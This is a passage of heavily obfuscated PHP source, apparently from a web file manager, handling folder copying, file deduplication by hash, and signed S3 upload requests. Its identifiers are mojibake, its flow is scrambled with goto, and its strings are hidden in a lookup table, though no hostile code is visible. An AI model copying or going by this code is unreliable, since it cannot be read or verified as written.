$f«‘„”Ä–Ë))->data($DˆÌÉßß×…)->save(); return $f«‘„”Ä–Ë; goto Eèí‰œÅÁ…; Eèí‰œÅÁ…: } private function clearShare($Fè¡½Ï¢¨, $C»ó¤‡‘) { goto D¹É¾ÂÏ£í; f±ÚŞ×Ÿ‘¼: if ($Dº†Éå³Ê[$aĞ³Š¶ÈÛ‡[482]] == $E’‰¥Ö·[$aĞ³Š¶ÈÛ‡[482]] && $Dº†Éå³Ê[$aĞ³Š¶ÈÛ‡[402]] == $aĞ³Š¶ÈÛ‡[561]) { return; } $cøö»Ó© = array($aĞ³Š¶ÈÛ‡[485] => array($aĞ³Š¶ÈÛ‡[511], $Dº†Éå³Ê[$aĞ³Š¶ÈÛ‡[485]] . $Fè¡½Ï¢¨ . $aĞ³Š¶ÈÛ‡[512])); $fµÚ³æí² = $this->field($aĞ³Š¶ÈÛ‡[408])->where($cøö»Ó©)->getField($aĞ³Š¶ÈÛ‡[394], !0); goto b™Ÿ“ì÷ñĞ; côŒ›Ñ¤‚Ş: Model($aĞ³Š¶ÈÛ‡[562])->where($cøö»Ó©)->save(array($aĞ³Š¶ÈÛ‡[473] => 0)); Model($aĞ³Š¶ÈÛ‡[563])->where($cøö»Ó©)->delete(); goto a’óùª‰ÊÒ; Aí¯ºâ²ÙŒ: if (!$F•ÖñİÓ“©) { return; } $F•ÖñİÓ“© = array_to_keyvalue($F•ÖñİÓ“©, $aĞ³Š¶ÈÛ‡[33], $aĞ³Š¶ÈÛ‡[466]); $cøö»Ó© = array($aĞ³Š¶ÈÛ‡[466] => array($aĞ³Š¶ÈÛ‡[7], $F•ÖñİÓ“©)); goto côŒ›Ñ¤‚Ş; D¹É¾ÂÏ£í: $aĞ³Š¶ÈÛ‡ =& $_SERVER[Ç³Íß¦Ó]; $Dº†Éå³Ê = $this->sourceInfo($Fè¡½Ï¢¨); $E’‰¥Ö· = $this->sourceInfo($C»ó¤‡‘); goto f±ÚŞ×Ÿ‘¼; b™Ÿ“ì÷ñĞ: if (!$fµÚ³æí²) { return; } $cøö»Ó© = array($aĞ³Š¶ÈÛ‡[394] => array($aĞ³Š¶ÈÛ‡[7], $fµÚ³æí²), $aĞ³Š¶ÈÛ‡[473] => 1); $F•ÖñİÓ“© = Model($aĞ³Š¶ÈÛ‡[562])->field($aĞ³Š¶ÈÛ‡[466])->where($cøö»Ó©)->select(); goto Aí¯ºâ²ÙŒ; a’óùª‰ÊÒ: } public function copyFolderFromIO($D†ğöô», $cµ‹Å‹£ò•, $eÅø·ª¥Ô’, $DÃÉ•«Éã, $cß‚„×˜§ù, $Cô¶¢¾§åâ = false) { goto c®À÷È·µÚ; c®À÷È·µÚ: $Då¼‰½êäÒ =& $_SERVER[Ç³Íß¦Ó]; $dß¼éæĞ‘ = array($Då¼‰½êäÒ[529] => array(), $Då¼‰½êäÒ[530] => array(), $Då¼‰½êäÒ[528] => array(), $Då¼‰½êäÒ[564] => array()); $e‹Ö·‡•÷ = $Cô¶¢¾§åâ ? $Cô¶¢¾§åâ : $D†ğöô»->pathThis($cµ‹Å‹£ò•); goto c¢ÃÖ¼†Â; C©Ô‡ÀĞğ­: Model($Då¼‰½êäÒ[531])->addAll($dß¼éæĞ‘[$Då¼‰½êäÒ[529]], array(), !0); Model($Då¼‰½êäÒ[532])->eventCopy($DŠ‹„„Ù…¢); $this->saveAll($dß¼éæĞ‘[$Då¼‰½êäÒ[530]]); goto DÛËÊ‹áœõ; C¥¦ŠÌîöÙ: Hook::trigger($Då¼‰½êäÒ[566]); if ($DŠ‹„„Ù…¢) { $this->folderSizeResetChildren($DŠ‹„„Ù…¢); } $this->_childrenListClear(); goto C©Ô‡ÀĞğ­; a¬áìÕÄÓ: if ($Fó¤À•‡‰Å) { $this->_childrenAllMake($Fó¤À•‡‰Å); } Hook::trigger($Då¼‰½êäÒ[565]); $this->_copyChildTo($D†ğöô», $cµ‹Å‹£ò•, $DŠ‹„„Ù…¢, $DÃÉ•«Éã, $dß¼éæĞ‘, $cß‚„×˜§ù); goto C¥¦ŠÌîöÙ; DÛËÊ‹áœõ: Model($Då¼‰½êäÒ[448])->linkAdd($dß¼éæĞ‘[$Då¼‰½êäÒ[528]]); Model($Då¼‰½êäÒ[448])->remove($dß¼éæĞ‘[$Då¼‰½êäÒ[564]]); $this->folderSizeReset($eÅø·ª¥Ô’); goto bÚà‚éšÑ…; bÚà‚éšÑ…: $this->updateModifyTime($eÅø·ª¥Ô’); return $DŠ‹„„Ù…¢; goto FÔËÆ—İ…¼; c¢ÃÖ¼†Â: $Fó¤À•‡‰Å = $this->fileNameExist($eÅø·ª¥Ô’, $e‹Ö·‡•÷); $DŠ‹„„Ù…¢ = $this->mkdir($eÅø·ª¥Ô’, $e‹Ö·‡•÷, $DÃÉ•«Éã); if (!$Fó¤À•‡‰Å || $DÃÉ•«Éã == REPEAT_RENAME_FOLDER) { $DÃÉ•«Éã = !1; } goto a¬áìÕÄÓ; FÔËÆ—İ…¼: } private function _copyChildTo($fŠ‚ÛŒŠ±‰, $bÇòŞ Ø×á, $C¹¤‡ó²–, $b¾µ×É”ï¤, &$b§µÔâ¾Ë‘, $EÏ·‘©Ó) { goto Eˆ¢ªÑ›•×; bï’Àù‘Ä: $BœÒ¥¡Ò²İ = array(); foreach ($BĞãˆ““° as &$cˆ‘Û¬™…) { goto e¸ÒÄëÚ´Å; dæ«¾Ë®“: if ($b¾µ×É”ï¤) { $fÆº«´ƒ¢ = $this->fileNameExistCache($C¹¤‡ó²–, $cˆ‘Û¬™…[$aô åğÔ‘[28]]); if ($fÆº«´ƒ¢) { if ($cˆ‘Û¬™…[$aô åğÔ‘[401]] || $b¾µ×É”ï¤ == REPEAT_SKIP) { continue; } if ($b¾µ×É”ï¤ == REPEAT_REPLACE) { $dÍó²‡àÕ¿ = $this->sourceInfoCache($fÆº«´ƒ¢); $C¤­éÆåêÆ = $this->fileHistory($dÍó²‡àÕ¿, $cˆ‘Û¬™…[$aô åğÔ‘[445]], $cˆ‘Û¬™…[$aô åğÔ‘[78]]); if ($C¤­éÆåêÆ) { $b§µÔâ¾Ë‘[$aô åğÔ‘[528]][] = $cˆ‘Û¬™…[$aô åğÔ‘[445]]; } continue; } else { if ($b¾µ×É”ï¤ == REPEAT_RENAME) { $cˆ‘Û¬™…[$aô åğÔ‘[28]] = $this->fileNameAutoCache($C¹¤‡ó²–, $cˆ‘Û¬™…[$aô åğÔ‘[28]], $b¾µ×É”ï¤, !1); } } } } if (!$cˆ‘Û¬™…[$aô åğÔ‘[401]] && $cˆ‘Û¬™…[$aô åğÔ‘[445]]) { $b§µÔâ¾Ë‘[$aô åğÔ‘[528]][] = $cˆ‘Û¬™…[$aô åğÔ‘[445]]; } $BœÒ¥¡Ò²İ[] = $this->_makeItemData($cˆ‘Û¬™…, $A„½–†÷ç, $cˆ‘Û¬™…[$aô åğÔ‘[28]]); goto F¨Á×Üªñ‘; d¯³¢­ÀÔº: $cˆ‘Û¬™…[$aô åğÔ‘[78]] = _get($cˆ‘Û¬™…, $aô åğÔ‘[78], 0); $cˆ‘Û¬™…[$aô åğÔ‘[445]] = _get($cˆ‘Û¬™…, $aô åğÔ‘[445], 0); if (!isset($cˆ‘Û¬™…[$aô åğÔ‘[567]]) && $cˆ‘Û¬™…[$aô åğÔ‘[445]]) { $b§µÔâ¾Ë‘[$aô åğÔ‘[564]][] = $cˆ‘Û¬™…[$aô åğÔ‘[445]]; } goto dæ«¾Ë®“; e¸ÒÄëÚ´Å: if (isset($B×•ğöŒ™·[$cˆ‘Û¬™…[$aô åğÔ‘[28]]])) { $cˆ‘Û¬™… = $B×•ğöŒ™·[$cˆ‘Û¬™…[$aô åğÔ‘[28]]]; } $cˆ‘Û¬™…[$aô åğÔ‘[401]] = $cˆ‘Û¬™…[$aô åğÔ‘[29]] == $aô åğÔ‘[77]; $cˆ‘Û¬™…[$aô åğÔ‘[403]] = _get($cˆ‘Û¬™…, $aô åğÔ‘[168], $aô åğÔ‘[33]); goto d¯³¢­ÀÔº; F¨Á×Üªñ‘: } unset($cˆ‘Û¬™…); goto f‰ù¢¬‡÷Ê; c‹ÍƒÜ·×é: $aƒ›ÊÛÒâ¸ = $aƒ›ÊÛÒâ¸ ? $aƒ›ÊÛÒâ¸ : array($aô åğÔ‘[74] => array(), $aô åğÔ‘[75] => array()); $BĞãˆ““° = array_merge($aƒ›ÊÛÒâ¸[$aô åğÔ‘[74]], $aƒ›ÊÛÒâ¸[$aô åğÔ‘[75]]); $B×•ğöŒ™· = $this->_addFiles($fŠ‚ÛŒŠ±‰, $aƒ›ÊÛÒâ¸[$aô åğÔ‘[74]], $EÏ·‘©Ó); goto bï’Àù‘Ä; Eˆ¢ªÑ›•×: $aô åğÔ‘ =& $_SERVER[Ç³Íß¦Ó]; $A„½–†÷ç = $this->sourceInfoCache($C¹¤‡ó²–); $aƒ›ÊÛÒâ¸ = $fŠ‚ÛŒŠ±‰->listPath($bÇòŞ Ø×á); goto c‹ÍƒÜ·×é; côäÆÇšã£: foreach ($BĞãˆ““° as $cˆ‘Û¬™…) { $dÍó²‡àÕ¿ = $cŒÌƒÊÑãá[$cˆ‘Û¬™…[$aô åğÔ‘[28]]]; $aµÍÈ»éÀ‘ = $dÍó²‡àÕ¿[$aô åğÔ‘[394]]; $this->_copyApplyMeta($dÍó²‡àÕ¿, $b§µÔâ¾Ë‘); if ($cˆ‘Û¬™…[$aô åğÔ‘[29]] == $aô åğÔ‘[77]) { $cˆ‘Û¬™…[$aô åğÔ‘[76]] = $fŠ‚ÛŒŠ±‰->getPathInner($cˆ‘Û¬™…[$aô åğÔ‘[76]]); $this->_copyChildTo($fŠ‚ÛŒŠ±‰, $cˆ‘Û¬™…[$aô åğÔ‘[76]], $aµÍÈ»éÀ‘, $b¾µ×É”ï¤, $b§µÔâ¾Ë‘, $EÏ·‘©Ó); } } goto fÊ”âˆâº°; f‰ù¢¬‡÷Ê: if (!empty($BœÒ¥¡Ò²İ)) { $this->addAll($BœÒ¥¡Ò²İ); $this->_childrenListSelect($C¹¤‡ó²–); } $cŒÌƒÊÑãá = $this->_childrenList($C¹¤‡ó²–); $cŒÌƒÊÑãá = array_to_keyvalue($cŒÌƒÊÑãá, $aô åğÔ‘[28]); goto côäÆÇšã£; fÊ”âˆâº°: } private function _addFiles($F®¸±Ë°¾à, $F¦ç™Œ…­ˆ, $b§¥¡äˆ’) { goto EÚÛ•ô«È; D·–âã†§: $bğŠ¥É¾ = Model($e‡»í¸ÆĞ—[570]); $f•·êÜóº‚ = $bğŠ¥É¾->where($c’„…ÚÕìŠ)->select(); $f•·êÜóº‚ = $f•·êÜóº‚ ? $f•·êÜóº‚ : array(); goto Cµ¦ÓÍº™; f¶«Ÿ ‡Ó¡: $f•·êÜóº‚ = $f•·êÜóº‚ ? $f•·êÜóº‚ : array(); foreach ($f•·êÜóº‚ as $a–µ‰Ñ—Üã) { if (!isset($E¢é¡É¥Ü[$a–µ‰Ñ—Üã[$e‡»í¸ÆĞ—[170]]])) { continue; } $d•§ğ©½°— =& $E¢é¡É¥Ü[$a–µ‰Ñ—Üã[$e‡»í¸ÆĞ—[170]]]; foreach ($d•§ğ©½°— as &$EêÑÕ’Š) { $EêÑÕ’Š[$e‡»í¸ÆĞ—[445]] = $a–µ‰Ñ—Üã[$e‡»í¸ÆĞ—[445]]; } unset($EêÑÕ’Š); } $Fõê½Üïë = array(); goto b¡Ë„Óà; Cµ¦ÓÍº™: foreach ($f•·êÜóº‚ as $a–µ‰Ñ—Üã) { if (!isset($E¢é¡É¥Ü[$a–µ‰Ñ—Üã[$e‡»í¸ÆĞ—[170]]])) { continue; } $F‘ë‘›’»š = $E¢é¡É¥Ü[$a–µ‰Ñ—Üã[$e‡»í¸ÆĞ—[170]]]; foreach ($F‘ë‘›’»š as &$EêÑÕ’Š) { $EêÑÕ’Š[$e‡»í¸ÆĞ—[445]] = $a–µ‰Ñ—Üã[$e‡»í¸ÆĞ—[445]]; $EêÑÕ’Š[$e‡»í¸ÆĞ—[567]] = !0; } unset($EêÑÕ’Š); } $f­ôá°ˆ¤³ = array(); foreach ($F¦ç™Œ…­ˆ as $dÜ­‘ó‹–) { if (isset($dÜ­‘ó‹–[$e‡»í¸ÆĞ—[567]]) && $dÜ­‘ó‹–[$e‡»í¸ÆĞ—[567]]) { continue; } $fÒ¥øÈÍ–à = $F®¸±Ë°¾à->getPathInner($dÜ­‘ó‹–[$e‡»í¸ÆĞ—[76]]); $f¹ºñ«¸ÔË = $bğŠ¥É¾->addFileMake($fÒ¥øÈÍ–à, $dÜ­‘ó‹–[$e‡»í¸ÆĞ—[78]], $dÜ­‘ó‹–[$e‡»í¸ÆĞ—[171]], $dÜ­‘ó‹–[$e‡»í¸ÆĞ—[170]], $dÜ­‘ó‹–[$e‡»í¸ÆĞ—[28]], $b§¥¡äˆ’); $f­ôá°ˆ¤³[] = $f¹ºñ«¸ÔË; } goto Câåì™ã³ì; Câåì™ã³ì: $bğŠ¥É¾->addAll($f­ôá°ˆ¤³); $c’„…ÚÕìŠ = array($e‡»í¸ÆĞ—[170] => array($e‡»í¸ÆĞ—[7], array_keys($E¢é¡É¥Ü))); $f•·êÜóº‚ = $bğŠ¥É¾->where($c’„…ÚÕìŠ)->select(); goto f¶«Ÿ ‡Ó¡; C¨èœğãÒò: foreach ($F¦ç™Œ…­ˆ as &$EêÑÕ’Š) { goto fæ‰ã“ÈÁí; Dƒ¼‡ö…à: $Eîø¢ÛÔÎˆ = $F®¸±Ë°¾à->hashMd5($EêÑÕ’Š[$e‡»í¸ÆĞ—[76]]); if (strlen($Eîø¢ÛÔÎˆ) > 10 && !isset($E¢é¡É¥Ü[$Eîø¢ÛÔÎˆ])) { $E¢é¡É¥Ü[$Eîø¢ÛÔÎˆ] = array(); } $EêÑÕ’Š[$e‡»í¸ÆĞ—[171]] = $A¡ì µß„Ô; goto Aòãò¥å“; fæ‰ã“ÈÁí: Hook::trigger($e‡»í¸ÆĞ—[568], $EêÑÕ’Š); $EêÑÕ’Š[$e‡»í¸ÆĞ—[76]] = $F®¸±Ë°¾à->getPathInner($EêÑÕ’Š[$e‡»í¸ÆĞ—[76]]); $A¡ì µß„Ô = $F®¸±Ë°¾à->hashSimple($EêÑÕ’Š[$e‡»í¸ÆĞ—[76]]); goto Dƒ¼‡ö…à; Aòãò¥å“: $EêÑÕ’Š[$e‡»í¸ÆĞ—[170]] = $Eîø¢ÛÔÎˆ; Hook::trigger($e‡»í¸ÆĞ—[569], $EêÑÕ’Š); $E¢é¡É¥Ü[$Eîø¢ÛÔÎˆ][] =& $EêÑÕ’Š; goto d¿ˆƒÈíœ; d¿ˆƒÈíœ: if (count($E¢é¡É¥Ü[$Eîø¢ÛÔÎˆ]) > 1) { $EêÑÕ’Š[$e‡»í¸ÆĞ—[567]] = !0; } goto Fó‹ÆÂ²†Â; Fó‹ÆÂ²†Â: } unset($EêÑÕ’Š); $c’„…ÚÕìŠ = array($e‡»í¸ÆĞ—[170] => array($e‡»í¸ÆĞ—[7], array_keys($E¢é¡É¥Ü))); goto D·–âã†§; b¡Ë„Óà: foreach ($F¦ç™Œ…­ˆ as $dÂã†é—®) { $Fõê½Üïë[$dÂã†é—®[$e‡»í¸ÆĞ—[28]]] = $dÂã†é—®; } return $Fõê½Üïë; goto D«ª‡íÛñ; EÚÛ•ô«È: $e‡»í¸ÆĞ— =& $_SERVER[Ç³Íß¦Ó]; if (!$F¦ç™Œ…­ˆ || count($F¦ç™Œ…­ˆ) == 0) { return array(); } $E¢é¡É¥Ü = array(); goto C¨èœğãÒò; D«ª‡íÛñ: } } define($_SERVER[Ç³Íß¦Ó][571], $_SERVER[Ç³Íß¦Ó][572]); goto BÅ­«¡Á›ä; eÛ…ãĞ¢‚Í: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($c›«òâŠÙŒ) { parent::__construct($c›«òâŠÙŒ); } public function uploadFormData($FØ¶áÔÒò‰, $eí§‚ËİŒ = 3600) { goto Cêó°áŠ¬î; f¿­‘Í¤‚: $d’Ö³ÛµŞù = base64_encode(json_encode($D§¼ÚŠ”ìĞ)); $fš®†ë×· = hash_hmac($f„È¦±˜ó[1232], $cùÑ³ğ½àŸ, $f„È¦±˜ó[1233] . $this->secret, !0); $C£Ô¯ÀğçŠ = hash_hmac($f„È¦±˜ó[1232], $this->region, $fš®†ë×·, !0); goto a–ßîâØ»; dé ˆÕ£å: $càŸ§Á¢ÑÜ = array($f„È¦±˜ó[210] => $f„È¦±˜ó[33], $f„È¦±˜ó[1234] => $f„È¦±˜ó[33], $f„È¦±˜ó[1191] => $D—Ü‡¼Ù¾, $f„È¦±˜ó[1195] => $b«°ø¹‰¨, $f„È¦±˜ó[1199] => $d’Ö³ÛµŞù, $f„È¦±˜ó[1235] => $e©‰ƒÁ“Öˆ, $f„È¦±˜ó[1236] => $döŸ›ÄÖÎÃ, $f„È¦±˜ó[1237] => $Cğ¦…ÜÊõŞ, $f„È¦±˜ó[1238] => $E”ÄïÚ¿¬š, $f„È¦±˜ó[1239] => $BÌÇÃ†ö‘, $f„È¦±˜ó[175] => $this->getHost()); return $càŸ§Á¢ÑÜ; goto cÇ°è­óŒ; a–ßîâØ»: $e†ÓôæÛÅ = hash_hmac($f„È¦±˜ó[1232], $cš„îçÚÌ˜, $C£Ô¯ÀğçŠ, !0); $A†Ÿ†¸‡ÚÕ = hash_hmac($f„È¦±˜ó[1232], $d›Ø†ë¹Ø¿, $e†ÓôæÛÅ, !0); $BÌÇÃ†ö‘ = hash_hmac($f„È¦±˜ó[1232], $d’Ö³ÛµŞù, $A†Ÿ†¸‡ÚÕ); goto dé ˆÕ£å; C›…¸ŒĞÈ†: $cš„îçÚÌ˜ = $f„È¦±˜ó[59]; $Cğ¦…ÜÊõŞ = gmdate($f„È¦±˜ó[1223]); $cùÑ³ğ½àŸ = gmdate($f„È¦±˜ó[715]); goto EŒñÑÈìµ; Cêó°áŠ¬î: $f„È¦±˜ó =& $_SERVER[Ç³Íß¦Ó]; $D—Ü‡¼Ù¾ = $f„È¦±˜ó[191]; $döŸ›ÄÖÎÃ = $f„È¦±˜ó[1222]; goto C›…¸ŒĞÈ†; EŒñÑÈìµ: $d›Ø†ë¹Ø¿ = $f„È¦±˜ó[1224]; $E”ÄïÚ¿¬š = $eí§‚ËİŒ . $f„È¦±˜ó[33]; $b«°ø¹‰¨ = $f„È¦±˜ó[1187]; goto d…Ñ®’Œó; d…Ñ®’Œó: $e™¹¹ğÀ·ª = array($this->accessKey, $cùÑ³ğ½àŸ, $this->region, $cš„îçÚÌ˜, $d›Ø†ë¹Ø¿); $e©‰ƒÁ“Öˆ = implode($f„È¦±˜ó[8], $e™¹¹ğÀ·ª); $D§¼ÚŠ”ìĞ = array($f„È¦±˜ó[1189] => gmdate($f„È¦±˜ó[1188], strtotime($f„È¦±˜ó[1225])), $f„È¦±˜ó[1190] => array(array($f„È¦±˜ó[1192] => $this->bucket), array($f„È¦±˜ó[1191] => $D—Ü‡¼Ù¾), array($f„È¦±˜ó[1193], $f„È¦±˜ó[1194], $f„È¦±˜ó[33]), array($f„È¦±˜ó[1193], $f„È¦±˜ó[1226], $f„È¦±˜ó[33]), array($f„È¦±˜ó[1193], $f„È¦±˜ó[1227], $f„È¦±˜ó[33]), array($f„È¦±˜ó[1195] => $b«°ø¹‰¨), array($f„È¦±˜ó[1228] => $e©‰ƒÁ“Öˆ), array($f„È¦±˜ó[1229] => $döŸ›ÄÖÎÃ), array($f„È¦±˜ó[1230] => $Cğ¦…ÜÊõŞ), array($f„È¦±˜ó[1231] => $E”ÄïÚ¿¬š))); goto f¿­‘Í¤‚; cÇ°è­óŒ: } public function multiUploadFormData($CÄ£¹¥¡Ì, $E÷à•îùÂ = 3600) { $b­ ŞÈÆ·ó =& $_SERVER[Ç³Íß¦Ó]; $dèàæ©ø± = gmdate($b­ ŞÈÆ·ó[1317]); $dšñ£ = array(); $f¬èÈÛÂ†Ü = $this->client->getUploadId($this->bucket, $CÄ£¹¥¡Ì, $dšñ£); if (!$f¬èÈÛÂ†Ü) { return !1; } return array($b­ ŞÈÆ·ó[220] => $f¬èÈÛÂ†Ü, $b­ ŞÈÆ·ó[175] => $this->getHost() . $b­ ŞÈÆ·ó[8] . $this->pathEncode($CÄ£¹¥¡Ì), $b­ ŞÈÆ·ó[221] => $dèàæ©ø±, $b­ ŞÈÆ·ó[93] => $CÄ£¹¥¡Ì); } public function multiUploadAuthData($d×¶æ‚˜Ôè, $EÕê¾¤Ê = array()) { goto F““ÅÈˆ¬É; F““ÅÈˆ¬É: $BÑ®­¤¦Ä° =& $_SERVER[Ç³Íß¦Ó]; $fÁÓøÍåø = isset($EÕê¾¤Ê[$BÑ®­¤¦Ä°[168]]) ? $EÕê¾¤Ê[$BÑ®­¤¦Ä°[168]] : $BÑ®­¤¦Ä°[33]; $E·ÊÁÌ¢Ó = $EÕê¾¤Ê[$BÑ®­¤¦Ä°[93]]; goto dåñ™Ùîˆ; dåñ™Ùîˆ: unset($EÕê¾¤Ê[$BÑ®­¤¦Ä°[93]]); if (isset($EÕê¾¤Ê[$BÑ®­¤¦Ä°[222]])) { return $this->listUploadParts($E·ÊÁÌ¢Ó, $EÕê¾¤Ê); } $B¢©Íá£‘„ = array(); goto bÛÕ¶±İ›‡; a«ó´‡ªÀ: $E·ĞÅ‚Â¸ = $BÑ®­¤¦Ä°[225]; $A¥ÇÄ¤ù„ã = $BÑ®­¤¦Ä°[8] . $this->pathEncode($E·ÊÁÌ¢Ó) . $fÁÓøÍåø; $dè°Œ·„Íó = $this->client->__getSignatureV4($B¢©Íá£‘„, $aĞ…ÁŠÖÈÑ, $E·ĞÅ‚Â¸, $A¥ÇÄ¤ù„ã); goto A±¿Û©‘‰©; A±¿Û©‘‰©: if (strpos($fÁÓøÍåø, $BÑ®­¤¦Ä°[224]) === 0) { if (isset($B¢©Íá£‘„[$BÑ®­¤¦Ä°[1319]])) { $bËËòš–Ü = $B¢©Íá£‘„[$BÑ®­¤¦Ä°[1319]]; } else { if (isset($dè°Œ·„Íó[$BÑ®­¤¦Ä°[1319]])) { $bËËòš–Ü = $dè°Œ·„Íó[$BÑ®­¤¦Ä°[1319]]; } else { $bËËòš–Ü = hash($BÑ®­¤¦Ä°[1232], $BÑ®­¤¦Ä°[33]); } } return array($BÑ®­¤¦Ä°[231] => $dè°Œ·„Íó[$BÑ®­¤¦Ä°[231]], $BÑ®­¤¦Ä°[1319] => $bËËòš–Ü, $BÑ®­¤¦Ä°[221] => $dè°Œ·„Íó[$BÑ®­¤¦Ä°[1322]]); } return $dè°Œ·„Íó[$BÑ®­¤¦Ä°[231]]; goto CˆË°íá; bÛÕ¶±İ›‡: if (isset($EÕê¾¤Ê[$BÑ®­¤¦Ä°[1318]])) { $B¢©Íá£‘„[$BÑ®­¤¦Ä°[1319]] = $EÕê¾¤Ê[$BÑ®­¤¦Ä°[1318]]; } $fŞğ±ˆÖ¬À = explode($BÑ®­¤¦Ä°[177], $this->getHost()); $aĞ…ÁŠÖÈÑ = array($BÑ®­¤¦Ä°[1320] => $fŞğ±ˆÖ¬À[1], $BÑ®­¤¦Ä°[1321] => $BÑ®­¤¦Ä°[33], $BÑ®­¤¦Ä°[210] => $BÑ®­¤¦Ä°[119], $BÑ®­¤¦Ä°[1234] => $EÕê¾¤Ê[$BÑ®­¤¦Ä°[78]]); goto a«ó´‡ªÀ; CˆË°íá: } public function listUploadParts($D¬ğŸ½©Ÿ, $C‚„´ğĞ‹Ş = array()) { goto a°…¥Çƒ•¤; d•šæÃÚã: $CÅÑ­îãÌ† = array($BœÆß¥ù„è[1320] => $c¾ã‚ƒŠàï[1], $BœÆß¥ù„è[210] => $BœÆß¥ù„è[119], $BœÆß¥ù„è[1234] => strlen($cŞ–¥£Ë¿ª)); $BÕÀö°Ğš = $BœÆß¥ù„è[223]; $Cí°àó‹ï» = $BœÆß¥ù„è[8] . $this->pathEncode($D¬ğŸ½©Ÿ) . $C‚„´ğĞ‹Ş[$BœÆß¥ù„è[168]]; goto A³‘Ÿøª¿ë; A³‘Ÿøª¿ë: $A×Æø¹ÛòŠ = $this->client->__getSignatureV4($d§·¸â´Ú¶, $CÅÑ­îãÌ†, $BÕÀö°Ğš, $Cí°àó‹ï», $cŞ–¥£Ë¿ª); return array($BœÆß¥ù„è[231] => $A×Æø¹ÛòŠ[$BœÆß¥ù„è[231]], $BœÆß¥ù„è[221] => $A×Æø¹ÛòŠ[$BœÆß¥ù„è[1322]], $BœÆß¥ù„è[233] => $c¦ÀŒå—, $BœÆß¥ù„è[1319] => $A×Æø¹ÛòŠ[$BœÆß¥ù„è[1319]]); goto F¬„“ÍéÛ; D¿Š§ŠË±: $cŞ–¥£Ë¿ª .= $BœÆß¥ù„è[1326]; $d§·¸â´Ú¶ = array(); $c¾ã‚ƒŠàï = explode($BœÆß¥ù„è[177], $this->getHost()); goto d•šæÃÚã; DÀ»’²: if (!$c¦ÀŒå—) { return !1; } $cŞ–¥£Ë¿ª = $BœÆß¥ù„è[1323]; foreach ($c¦ÀŒå— as $A¹ÓÖæğ±) { $cŞ–¥£Ë¿ª .= $BœÆß¥ù„è[1324] . "\x3c\x50\x61\162\x74\x4e\165\x6d\x62\145\162\x3e{$A¹ÓÖæğ±[$BœÆß¥ù„è[1279]]}\74\57\x50\141\x72\164\116\x75\155\x62\145\x72\x3e\xa" . "\74\x45\x54\141\x67\x3e{$A¹ÓÖæğ±[$BœÆß¥ù„è[1280]]}\x3c\57\105\124\141\x67\76\xa" . $BœÆß¥ù„è[1325]; } goto D¿Š§ŠË±; a°…¥Çƒ•¤: $BœÆß¥ù„è =& $_SERVER[Ç³Íß¦Ó]; $d’®øÖÎ– = str_replace($BœÆß¥ù„è[232], $BœÆß¥ù„è[33], $C‚„´ğĞ‹Ş[$BœÆß¥ù„è[168]]); $c¦ÀŒå— = $this->client->listParts($this->bucket, $D¬ğŸ½©Ÿ, $d’®øÖÎ–); goto DÀ»’²; F¬„“ÍéÛ: } public function link($EàË°¶ïùÔ, $CÁªåˆ»î = array()) { return parent::link($EàË°¶ïùÔ, $CÁªåˆ»î); } public function fileOut($f˜§Ù«—Õí, $F ˜²£º¯• = false, $bó™ÆèÌ”ì = false, $BÃË¿•ÈŠÕ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ç³Íß¦Ó][1327])) { return parent::fileOutServer($f˜§Ù«—Õí, $F ˜²£º¯•, $bó™ÆèÌ”ì, $BÃË¿•ÈŠÕ); } parent::fileOut($f˜§Ù«—Õí, $F ˜²£º¯•, $bó™ÆèÌ”ì, $BÃË¿•ÈŠÕ); } public function fileOutImage($AùºÃ­è¸Ÿ, $dÀºŸĞÍÂŞ = 250) { if (strstr($this->endpoint, $_SERVER[Ç³Íß¦Ó][1327])) { return parent::fileOutImageServer($AùºÃ­è¸Ÿ, $dÀºŸĞÍÂŞ); } parent::fileOutImage($AùºÃ­è¸Ÿ, $dÀºŸĞÍÂŞ); } public function fileOutLink($d·šïà‘Ç) { $C»ŸÁğí =& $_SERVER[Ç³Íß¦Ó]; if (substr($d·šïà‘Ç, 0, 7) == $C»ŸÁğí[1202]) { $d·šïà‘Ç = $C»ŸÁğí[1203] . substr($d·šïà‘Ç, 7); } header($C»ŸÁğí[159] . $d·šïà‘Ç); die; } public function getHost() { $aÕŸ§èß““ =& $_SERVER[Ç³Íß¦Ó]; $dóÉËóôÉ¡ = str_rtrim(parent::getHost(), $aÕŸ§èß““[8] . $this->bucket); $dóÉËóôÉ¡ = explode($aÕŸ§èß““[177], $dóÉËóôÉ¡); return $dóÉËóôÉ¡[0] . $aÕŸ§èß““[177] . $this->bucket . $aÕŸ§èß““[95] . $dóÉËóôÉ¡[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($E‚ôŠ¾¹£í, $DËêë¹×ï = 0) { parent::__construct(); $this->source = $E‚ôŠ¾¹£í; $this->sourceSize = $DËêë¹×ï; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Bó«„„§˜¢ = false) { return $this->sourceSize; } public function getContent($f¥ÔªƒÇ†ê = false) { return $this->fileSubstr($f¥ÔªƒÇ†ê, 0, $this->sourceSize); } public function fileSubstr($BøÓİˆ“Ÿ = false, $BÕç¢Šøø = 0, $b·î÷Å­â = 0) { if (!$b·î÷Å­â) { $b·î÷Å­â = $this->sourceSize; } $eÓ¬ïíŠ®· = $this->sourceSize - $BÕç¢Šøø; if ($b·î÷Å­â >= $eÓ¬ïíŠ®·) { $b·î÷Å­â = $eÓ¬ïíŠ®·; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $BÕç¢Šøø, $b·î÷Å­â); } if ($this->sourceType == self::TYPE_FILE) { if ($b·î÷Å­â <= 0) { return $_SERVER[Ç³Íß¦Ó][33]; } $dîŠ»Ó‹ÅÀ = ftell($this->source); fseek_64($this->source, $dîŠ»Ó‹ÅÀ + $BÕç¢Šøø); $cëİ‚Ñ¼æ = @fread($this->source, $b·î÷Å­â); fseek_64($this->source, $dîŠ»Ó‹ÅÀ); return $cëİ‚Ñ¼æ; } } public function hashMd5($a„ë‰ªËÖ = false) { return md5($this->getContent()); } public static function hash($D™·ŸÔ”°ê, $aø””¾£Ë‹ = 0) { $C‘µÙ˜­Ç¦ = new PathDriverStream($D™·ŸÔ”°ê, $aø””¾£Ë‹); return $C‘µÙ˜­Ç¦->hashSimple($D™·ŸÔ”°ê); } public static function md5($cÄ”Õ÷¾À, $dÛì²œø¿Ñ = 0) { $aà²’×´°Ì = new 